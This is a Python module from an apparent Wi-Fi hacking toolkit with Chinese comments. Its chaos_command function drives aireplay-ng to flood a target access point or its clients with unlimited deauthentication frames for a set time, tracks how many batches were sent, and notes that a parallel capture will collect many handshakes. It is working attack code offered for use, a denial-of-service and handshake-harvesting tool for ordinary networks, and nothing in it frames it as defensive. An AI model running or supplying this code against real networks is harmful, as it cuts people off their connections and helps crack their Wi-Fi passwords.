

from dataclasses import dataclass
import os
import subprocess
import sys
import tempfile
import time
from typing import Optional

from .deauth import build_deauth_argv, lock_channel, validate_bssid, validate_station
from wifi_infra.errors import WifiHackingToolError
from wifi_infra.iface import require_monitor_mode
from wifi_infra.runner import start_process
from wifi_infra.utils import require_linux


@dataclass
class ChaosResults:
    bssid: str
    station: str
    elapsed: float
    sent: int
    log_path: str
    message: str



def chaos_command(
        bssid: str, iface: str, channel: int, station: str = 'all', duration: int = 300, output_dir: Optional[str] = None
    ) -> ChaosResults:
    """彩蛋, 让目标持续断网"""
    require_linux("aireplay-ng")
    bssid = validate_bssid(bssid)
    station = validate_station(station)

    require_monitor_mode(iface)
    lock_channel(iface, channel)

    if output_dir is None:
        output_dir = tempfile.mkdtemp(prefix="WifiHackingTool-chaos-")
    log_path = os.path.join(output_dir, "chaos.log")

    argv = build_deauth_argv(iface, bssid, station, 0) # count 为 0 就是无限发
    print(f"[chaos] {' '.join(argv)}", file=sys.stderr)

    started = time.time()
    sent = 0

    # 开始搞破坏.
    # aireplay 每发一批会打一行 "Sending 64 directed DeAuth ..."，
    # 把输出写进日志再数 "Sending"，就知道到底有没有真在发。
    with open(log_path, "w", encoding="utf-8", errors="replace") as log:
        handler = start_process(argv, stdout=log, stderr=subprocess.STDOUT)
        if handler.proc is None:
            raise WifiHackingToolError(f"启动 aireplay-ng 失败: [{handler.error}]", return_code=3)

        try:
            while time.time() - started < duration:
                if handler.poll():
                    break # 进程已经释放
                print(
                    f"\r[chaos] {time.time() - started:5.1f}s / {duration}s  "
                    f"批次={sent}  目标掉线中…",
                    end="", file=sys.stderr, flush=True,
                )
                time.sleep(1)
                try:
                    with open(log_path, "r", encoding="utf-8", errors="replace") as f:
                        sent = f.read().count("Sending")
                except OSError:
                    pass
        except KeyboardInterrupt:
            print("\n[chaos] 收到 Ctrl-C, 停止", file=sys.stderr)
        finally:
            handler.terminate()
            print("\r" + " " * 58 + "\r", end="", file=sys.stderr, flush=True) # 清掉进度条

        elapsed = time.time() - started
        try:
            with open(log_path, "r", encoding="utf-8", errors="replace") as f:
                sent = f.read().count("Sending")
        except OSError:
            pass

        if sent == 0:
            message = (
                "一批 deauth 都没发出去，可能原因：\n"
                "  → 这个 AP 下没有客户端（先 scan, 或用 --station 指定）\n"
                "  → 客户端开了 PMF / 用的是 WPA3, deauth 会被直接丢弃\n"
                "  → 信道锁错了（--channel 必须和 AP 一致）\n"
                f"  → 看日志：{log_path}"
            )
        else:
            message = (
                f"发了 {sent} 批 deauth（约 {sent * 64} 帧），持续 {elapsed:.0f} 秒\n"
                f"  → 目标应当在反复重连/掉线\n"
                f"  → 同时开 capture 的话，会捞到大量握手"
            )

        return ChaosResults(
            bssid=bssid, station=station, elapsed=elapsed,
            sent=sent, log_path=log_path, message=message
        )
        


